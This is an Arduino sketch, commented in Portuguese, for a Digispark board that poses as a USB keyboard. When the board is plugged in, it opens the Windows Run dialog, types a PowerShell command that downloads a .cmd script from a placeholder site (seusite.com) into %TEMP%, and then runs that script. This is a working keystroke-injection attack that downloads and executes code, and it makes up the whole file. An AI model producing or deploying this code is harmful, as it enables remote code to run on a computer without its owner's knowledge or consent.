#include "DigiKeyboard.h"

void setup() {
  // 1) Espera o Windows ficar pronto
  DigiKeyboard.delay(5000);

  // 2) Abre Run (Win+R)
  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 3) Comando para baixar o script via PowerShell
  DigiKeyboard.print(
    "powershell -Command \""
    "(New-Object System.Net.WebClient).DownloadFile("
      "'https://seusite.com/install-node.cmd',"
      "'%TEMP%\\\\install-node.cmd'"
    ")\""
  );
  DigiKeyboard.sendKeyPress(KEY_ENTER);

  // 4) Aguarda o download
  DigiKeyboard.delay(3000);

  // 5) Abre de novo o Run (Win+R)
  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 6) Executa o script que ficou em %TEMP%
  DigiKeyboard.print("%TEMP%\\\\install-node.cmd");
  DigiKeyboard.sendKeyPress(KEY_ENTER);
}

void loop() {
  // não faz nada depois
}
